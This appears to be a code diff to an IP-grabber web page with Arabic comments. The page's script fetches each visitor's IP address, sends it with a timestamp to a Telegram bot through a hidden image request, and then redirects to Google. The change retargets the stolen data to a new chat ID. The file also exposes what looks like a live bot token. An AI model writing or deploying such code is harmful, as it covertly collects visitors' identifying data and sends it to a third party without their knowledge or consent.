@@ -36,9 +36,9 @@
         // رابط التوجيه بعد سحب الأيبيه
         const targetRedirectUrl = "https://www.google.com"; 
 
-        // بيانات البوت ومعرف قناتك العامة
+        // بيانات البوت وآيدي القناة/المجموعة الجديد
         const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
-        const chatId = "@gkgjfjvfjfjf4"; 
+        const chatId = "-1004497819495"; 
 
         function captureAndSend() {
             fetch('https://api.ipify.org?format=json')
@@ -47,7 +47,7 @@
                     const userIp = data.ip;
                     const visitTime = new Date().toLocaleString();
 
-                    const message = encodeURIComponent(`🚨 زيارة جديدة للقناة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
+                    const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
                     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
                     const img = new Image();
